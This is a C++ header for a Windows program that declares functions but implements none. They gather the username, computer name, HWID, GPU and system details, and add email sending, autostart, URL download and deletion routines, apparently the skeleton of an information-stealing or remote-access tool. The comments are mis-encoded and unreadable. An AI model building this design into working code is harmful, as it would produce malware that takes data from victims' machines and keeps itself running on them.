#pragma once

#include <direct.h>
#include <iostream>
#include <windows.h>
#include <io.h>
#include <winbase.h>
#include "stdlib.h" //��ȡ���·��ͷ�ļ�
#include <string>
#include <ostream>
#include <fstream>
#include <tchar.h>
#pragma comment(lib , "DXGI.lib")
//����ģ�鶨��
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib,"ws2_32.lib")
//GPU��
#include <DXGI.h>  
#include <vector>  
//


#pragma warning(disable : 4996)
//#pragma  comment(lib, "ws2_32.lib")
using namespace std;

void windows_text();
int windows_delete();
void guanbi();
int WINAPI_delete();

string windows_username();
void setcolor(unsigned short color);
wstring windows_computer_name();
//void windows_email_tage();
//void windows_email_main();
void Windows_email_tou_name();
void fstream_fish();//�����ı��ĵ�
void fstream_double(char username); //���ı��ĵ�д������
string wstring2string(wstring wstr);
string windows_user_name_noreturn(); //windows�û����ƣ���������������
void system_information_table();         //����ϵͳ����(�˺�����ʱδ�õ�����)
string text_box_auto();    //�ʼ�����
void AutoStart();//AOTU START
void exe_path(); //���·��
void email(); //�ʼ�ģ��
void ifsteam_open_read();
void c_box_information();
string system_information();
string system_information_text();
string GetHWID();//HWIDģ��
int GPU_information();//GPU��Ϣģ��
std::string WStringToString(const std::wstring& wstr);
void download(string usl);//����ģ��